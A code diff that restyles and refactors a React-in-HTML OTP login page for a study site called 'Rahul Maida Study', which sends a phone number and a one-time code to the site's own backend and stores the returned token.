@@ -9,109 +9,126 @@
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #020617; color: white; }
-        .glass { background: #1e293b; border: 1px solid #334155; }
-        .loader { border-top-color: #3b82f6; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .glass { background: #111827; border: 1px solid #374151; }
+        .error-msg { color: #f87171; font-weight: bold; margin-bottom: 1rem; text-align: center; }
+        .success-msg { color: #4ade80; font-weight: bold; margin-bottom: 1rem; text-align: center; }
     </style>
 </head>
-<body class="flex items-center justify-center h-screen">
+<body class="bg-[#030712] text-white flex items-center justify-center min-h-screen">
     <div id="root"></div>
+
     <script type="text/babel">
         const { useState, useEffect } = React;
-        const API_BASE = "https://rahulmaidastudy-backend-1.onrender.com"; 
+        const API_BASE = "https://rahulmaidastudy-backend-1.onrender.com";
 
-        // Session logic
-        const getRID = () => {
+        // Stable Random ID for the session
+        const getSessionID = () => {
             let id = sessionStorage.getItem('sid');
             if(!id) {
-                id = 'pw-' + Math.random().toString(36).substr(2, 16);
+                id = "dd85b4b1-abad-4e01-b3ae-" + Math.random().toString(16).slice(2, 14);
                 sessionStorage.setItem('sid', id);
             }
             return id;
-        }
+        };
 
         function App() {
             const [phone, setPhone] = useState('');
             const [otp, setOtp] = useState('');
             const [step, setStep] = useState(1);
             const [loading, setLoading] = useState(false);
+            const [msg, setMsg] = useState({ type: '', text: '' });
 
-            const send = async () => {
-                if(phone.length < 10) return alert("Pehle 10-digit number toh daalo bhai!");
+            const showMsg = (text, type = 'error') => {
+                setMsg({ text, type });
+                setTimeout(() => setMsg({ text: '', type: '' }), 5000);
+            };
+
+            const handleSend = async () => {
+                if(phone.length !== 10) return showMsg("Please enter 10 digit number");
                 setLoading(true);
                 try {
-                    const r = await fetch(`${API_BASE}/api/login/send-otp`, {
+                    const res = await fetch(`${API_BASE}/api/login/send-otp`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ phoneNumber: phone, randomId: getRID() })
+                        body: JSON.stringify({ phoneNumber: phone, randomId: getSessionID() })
                     });
-                    const d = await r.json();
-                    if(d.success) setStep(2); 
-                    else alert(d.message || "Failed to send OTP");
-                } catch(e) { alert("Backend link error! Check Render."); }
-                setLoading(false);
-            }
-
-            const verify = async () => {
-                setLoading(true);
-                try {
-                    const r = await fetch(`${API_BASE}/api/login/verify-otp`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ phoneNumber: phone, otp: otp, randomId: getRID() })
-                    });
-                    const d = await r.json();
-                    if(d.success) {
-                        alert("Bhai Waah! Login Done.");
-                        localStorage.setItem('token', d.data.token);
+                    const data = await res.json();
+                    if(data.success) {
+                        setStep(2);
+                        showMsg("OTP Sent Successfully!", "success");
                     } else {
-                        alert("Error: " + d.message);
+                        showMsg(data.message || "Failed to send OTP");
                     }
-                } catch(e) { alert("Verify failed!"); }
+                } catch (e) { showMsg("Server connection error"); }
                 setLoading(false);
-            }
+            };
+
+            const handleVerify = async () => {
+                if(otp.length < 6) return showMsg("Enter 6 digit OTP");
+                setLoading(true);
+                try {
+                    const res = await fetch(`${API_BASE}/api/login/verify-otp`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ phoneNumber: phone, otp: otp, randomId: getSessionID() })
+                    });
+                    const data = await res.json();
+                    if(data.success) {
+                        showMsg("Login Successful!", "success");
+                        localStorage.setItem('token', data.data.token);
+                    } else {
+                        showMsg(data.message || "Invalid OTP or Session Expired");
+                    }
+                } catch (e) { showMsg("Verification error"); }
+                setLoading(false);
+            };
 
             return (
-                <div className="glass p-8 rounded-[2rem] w-full max-w-sm shadow-2xl">
-                    <h1 className="text-2xl font-black text-center text-blue-500 mb-8 tracking-tighter">RAHUL MAIDA STUDY</h1>
+                <div className="glass p-10 rounded-[2.5rem] w-full max-w-sm shadow-2xl">
+                    <h1 className="text-2xl font-black text-center text-blue-500 mb-8 uppercase tracking-widest">Rahul Maida Study</h1>
                     
+                    {msg.text && (
+                        <div className={msg.type === 'success' ? 'success-msg' : 'error-msg'}>
+                            {msg.text}
+                        </div>
+                    )}
+
                     {step === 1 ? (
-                        <div className="space-y-4">
+                        <div className="space-y-6">
                             <input 
-                                type="tel" maxLength="10" placeholder="Mobile Number" 
-                                className="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl text-center text-xl outline-none"
+                                type="tel" maxLength="10" placeholder="Mobile Number" autoComplete="off"
+                                className="w-full bg-slate-900/50 border border-slate-700 p-4 rounded-2xl text-xl text-center outline-none focus:border-blue-500"
                                 value={phone} onChange={e => setPhone(e.target.value)}
                             />
                             <button 
-                                onClick={send} disabled={loading}
-                                className="w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-xl font-bold flex justify-center items-center"
+                                onClick={handleSend} disabled={loading}
+                                className="w-full bg-blue-600 p-4 rounded-2xl font-bold text-lg active:scale-95 transition-all disabled:opacity-50"
                             >
-                                {loading && <div className="loader w-5 h-5 border-2 rounded-full mr-2"></div>}
                                 {loading ? "Bheja ja raha hai..." : "Get OTP"}
                             </button>
                         </div>
                     ) : (
-                        <div className="space-y-4">
+                        <div className="space-y-6">
                             <input 
-                                id="otp-field-new" name="no-autofill" type="text" maxLength="6" placeholder="******" 
-                                className="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl text-center text-3xl tracking-[12px] outline-none"
+                                type="text" maxLength="6" placeholder="000000" autoComplete="off"
+                                className="w-full bg-slate-900/50 border border-slate-700 p-4 rounded-2xl text-3xl text-center tracking-[10px] outline-none focus:border-green-500"
                                 value={otp} onChange={e => setOtp(e.target.value)}
                             />
                             <button 
-                                onClick={verify} disabled={loading}
-                                className="w-full bg-green-600 hover:bg-green-700 p-4 rounded-xl font-bold flex justify-center items-center"
+                                onClick={handleVerify} disabled={loading}
+                                className="w-full bg-green-600 p-4 rounded-2xl font-bold text-lg active:scale-95 transition-all disabled:opacity-50"
                             >
-                                {loading && <div className="loader w-5 h-5 border-2 rounded-full mr-2"></div>}
-                                {loading ? "Check ho raha..." : "Verify & Login"}
+                                {loading ? "Cheking OTP..." : "Verify & Proceed"}
                             </button>
-                            <p onClick={() => setStep(1)} className="text-center text-slate-500 text-sm cursor-pointer underline">Number Badlein</p>
+                            <p onClick={() => setStep(1)} className="text-center text-slate-500 cursor-pointer text-sm font-bold">Number Badlein</p>
                         </div>
                     )}
                 </div>
             );
         }
-        ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
     </script>
 </body>
 </html>
